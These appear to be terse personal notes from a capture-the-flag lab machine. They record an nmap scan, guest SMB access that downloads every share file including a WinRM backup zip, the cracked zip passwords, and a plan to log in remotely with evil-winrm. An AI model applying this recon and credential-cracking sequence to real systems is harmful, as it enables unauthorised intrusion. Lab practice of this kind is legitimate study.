 10.129.73.127

```
┌──(kali㉿kali)-[~]
└─$ nmap -Pn 10.129.73.127
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-14 08:47 EDT
Nmap scan report for 10.129.73.127
Host is up (0.34s latency).
Not shown: 989 filtered ports
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
```

not happening
trying using smb

```
smbclient \\\\timelapse.htb\\Shares -I 10.10.11.152 -u guest

└─$ smbclient \\\\10.129.73.127\\Shares -I 10.129.73.127 -u guest                            1 ⨯
Try "help" to get a list of possible commands.
smb: \> find .
find: command not found
smb: \> download
download: command not found
smb: \> N -c 'prompt OFF;recurse ON;cd 'path\to\directory\';lcd '~/path/to/download/to/';mget *'` 
N: command abbreviation ambiguous
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> cd .
smb: \> lcd .
smb: \> mget *
getting file \Dev\winrm_backup.zip of size 2611 as Dev/winrm_backup.zip (1.3 KiloBytes/sec) (average 1.3 KiloBytes/sec)
getting file \HelpDesk\LAPS.x64.msi of size 1118208 as HelpDesk/LAPS.x64.msi (140.2 KiloBytes/sec) (average 111.8 KiloBytes/sec)
getting file \HelpDesk\LAPS_Datasheet.docx of size 104422 as HelpDesk/LAPS_Datasheet.docx (52.5 KiloBytes/sec) (average 102.0 KiloBytes/sec)
getting file \HelpDesk\LAPS_OperationsGuide.docx of size 641378 as HelpDesk/LAPS_OperationsGuide.docx (132.2 KiloBytes/sec) (average 110.7 KiloBytes/sec)
getting file \HelpDesk\LAPS_TechnicalSpecification.docx of size 72683 as HelpDesk/LAPS_TechnicalSpecification.docx (35.4 KiloBytes/sec) (average 102.5 KiloBytes/sec)
```

tried to crack the password of the winrm zip files

passwords supremelegacy and thuglegacy

then use the certificate to connect ot the machine with evilrm.

evilrm is aparantly 151 mb so leaving it.
